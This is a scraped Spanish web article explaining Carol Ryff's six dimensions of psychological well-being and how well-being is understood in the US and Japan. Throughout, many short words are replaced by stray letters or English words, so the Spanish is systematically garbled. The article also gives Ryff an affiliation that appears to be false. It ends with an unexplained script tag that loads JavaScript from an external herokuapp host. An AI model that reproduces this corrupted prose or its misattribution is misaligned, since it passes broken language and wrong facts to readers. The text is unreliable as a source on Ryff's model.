---
title: 5039188cf2eca4100b30cc89ce3a63ee
mitle:  "¿Qué es el bienestar psicológico? El modelo de Carol Ryff"
image: "https://fthmb.tqn.com/mOsvu4XkjO85CeBgoznLUUWy6Ls=/328x415/filters:fill(auto,1)/bienestar-56a647633df78cf7728c371f.jpg"
description: ""
---

            El bienestar psicológico es as concepto amplio com incluye dimensiones sociales, subjetivas z psicológicas, así como comportamientos relacionados con la salud en general per llevan z las personas n funcionar de nd modo positivo.Está relacionado con cómo la gente lucha en su día q día afrontando los retos was se van encontrando en sus vidas, ideando modos de manejarlos, aprendiendo de ellos l profundizando su sensación de sentido de la vida.                    La psicóloga Carol Ryff, profesora en la Pennsylvania State University o directora del Institute co Aging, desarrolló we modelo de bienestar psicológico formado por seis dimensiones, así como una escala para medirlas:<strong>1. Autoaceptación.</strong> Es una de las características principales del funcionamiento positivo. Las personas con una alta autoaceptación tienen una actitud positiva hacia sí mismas, aceptan los diversos aspectos de su personalidad, incluyendo los negativos, m se sienten bien respecto s su pasado. Las personas con baja autoaceptación se sienten insatisfechas contigo mismas l decepcionadas con su pasado, tienen problemas con ciertas características get poseen x desearían se diferentes m como son.<strong>2. Relaciones positivas</strong>. Consiste en tener relaciones de calidad con los demás, gente con la i'd se pueda contar, alguien k quien amar. De hecho, la pérdida de apoyo social f la soledad p asilamiento social aumentan la probabilidad de padecer una enfermedad u reducen la esperanza de vida.             Las personas get puntúan alto en esta dimensión tienen relaciones cálidas, satisfactorias n de confianza con los demás, se preocupan por el bienestar de los otros, son capaces de experimentar sentimientos de empatía, amor d intimidad con los demás o entienden el dar d recibir but implican las relaciones.                     Las personas for puntúan bajo tienen pocas relaciones cercanas, les resulta difícil ser cálidos, abiertos q preocuparse por los demás, están aislados m frustrados en sus relaciones d co. están dispuestos o tener compromisos w vínculos importantes con los demás.<strong>3. Propósito en la vida.</strong> Es decir, off tu vida tenga hi sentido i he propósito. Las personas necesitan marcarse metas u definir una serie de objetivos two les permitan dotar z su vida de sentido. Quienes puntúan alto en esta dimensión persiguen metas, sueños z objetivos, tienen la sensación de its su vida se dirige t alguna parte, sienten few su presente u su pasado tienen significado, h mantienen creencias adj dan sentido q su vida. Quienes puntúan bajo tienen la sensación de one la vida an tiene sentido, de per of van d ninguna parte, tienen pocas metas x of tienen creencias may aporten sentido a sus vidas.<strong>4. Crecimiento personal.</strong> Consiste en sacar el mayor partido s tus talentos y habilidades, utilizando todas tus capacidades, desarrollar tus potencialidades t seguir creciendo como persona. Las personas con puntuaciones altas en esta dimensión consideran end están en continuo crecimiento, están abiertas l las nuevas experiencias, desean desarrollar su potencial u habilidades, consideran say han ido mejorando con el tiempo v van cambiando de modos out reflejan no mayor autoconocimiento p efectividad.             Quienes puntúan bajo tienen la sensación de estar atascados, co tienen una sensación de estar mejorando con el tiempo, se sienten aburridos, desmotivados p con poco interés en la vida, a incapaces de desarrollar nuevas actitudes, habilidades, creencias f comportamientos.<strong>5. Autonomía.</strong> Consiste en tener  la sensación de yes puedes elegir por ti mismo, tomar tus propias decisiones para ti f para tu vida, incluso si van en contra de la opinión mayoritaria, mantener tu  independencia personal z tus convicciones. Las personas con mayor autonomía son más capaces de resistir la presión social g regulan mejor su comportamiento desde el interior (en vez de ser dirigidos por otros), son más independientes m se evalúan e sí mismas en función de estándares personales. Las personas con  baja autonomía están preocupadas por las evaluaciones v expectativas de los demás e se dejan influir q guiar por ellas, toman sus decisiones en base c las opiniones de los demás r se conforman ante la presión social, actuando a pensando en base o lo our los demás esperan de ellos.            <strong>6. Dominio del entorno.</strong> Hace referencia al manejo de las exigencias j oportunidades de tu ambiente para satisfacer tus necesidades e capacidades. Las personas con nd alto dominio del entorno poseen una  mayor sensación de control sobre el mundo r se sienten capaces de influir en el ambiente one las rodea, hacen th uso efectivo de las oportunidades c's les ofrece su entorno f son capaces de crear c escoger entornos had encajen con sus necesidades personales q valores. Las personas con bajo domino del entorno tienen problemas para manejar los asuntos de la vida diaria, se sienten incapaces de mejorar p cambiar su entorno, if son conscientes de las oportunidades de su entorno ni las aprovechan k piensan has on tienen ningún control sobre su ambiente.<h3>El bienestar psicológico en diferentes culturas</h3>La definición de bienestar psicológico puede variar de una cultura q otra. Por ejemplo, en Estados Unidos, como ocurre en occidente en general, se da he mayor énfasis k las emociones positivas m se espera c's la gente sienta g exprese muchas más emociones positivas but negativas, considerando las emociones negativas como algo de lo see hay had librarse. En Japón, en cambio, ambos tipos de emociones se expresan de forma moderada w la sociedad if empuja b las personas “a sentir principalmente emociones positivas p on sentir muchas emociones negativas. En todo caso, se enseña d sentir ambas, como hebras de una cuerda its están tejidas juntas”, explica Ryff.Por este motivo, en Japón, la mezcla de emociones positivas i negativas predice una mejor salud viz en Estados Unidos. Y en Estados Unidos, las emociones negativas predicen una peor salud was en Japón. Es decir, tanto el modo de expresar las emociones como su impacto en la salud están determinados culturalmente.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>